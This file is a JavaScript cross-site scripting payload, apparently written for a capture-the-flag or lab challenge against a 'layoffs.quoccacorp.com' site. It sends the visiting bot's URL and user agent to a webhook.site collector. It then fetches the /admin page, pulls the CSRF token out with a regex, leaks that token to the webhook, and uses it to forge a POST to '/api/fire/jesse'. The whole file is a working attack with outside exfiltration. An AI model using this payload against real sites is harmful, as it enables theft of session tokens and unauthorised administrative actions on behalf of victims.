const WEBHOOK_URL = "https://webhook.site/4548d123-8f9b-4f6d-922b-83fa7e59bb2b";

function exfiltrate(data) {
  fetch(WEBHOOK_URL, {
    method: "POST",
    mode: "no-cors",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify(data),
  }).catch((e) => console.log(e));
}

exfiltrate({
  step: "1. Payload started",
  bot_url: window.location.href,
  bot_user_agent: navigator.userAgent,
});

fetch("https://layoffs.quoccacorp.com/admin")
  .then((response) => {
    exfiltrate({ step: "2. Fetched /admin", status: response.status });
    return response.text();
  })
  .then((html) => {
    const match = html.match(/GLOBAL_CSRF_TOKEN = "(.*?)";/);

    if (match) {
      const freshCsrfToken = match[1];

      exfiltrate({ step: "3. Token extracted", token: freshCsrfToken });

      fetch("https://layoffs.quoccacorp.com/api/fire/jesse", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          csrf_token: freshCsrfToken,
        }),
      })
        .then((fireResponse) => {
          exfiltrate({
            step: "4. Fire request sent",
            status: fireResponse.status,
          });
        })
        .catch((error) => {
          exfiltrate({ step: "Error firing target", error: error.message });
        });
    } else {
      exfiltrate({
        step: "Error: Token not found",
        html_snippet: html.substring(0, 500), // Send the first 500 chars to debug
      });
    }
  })
  .catch((error) => {
    // Log Error: Fetching /admin failed
    exfiltrate({ step: "Error fetching /admin", error: error.message });
  });
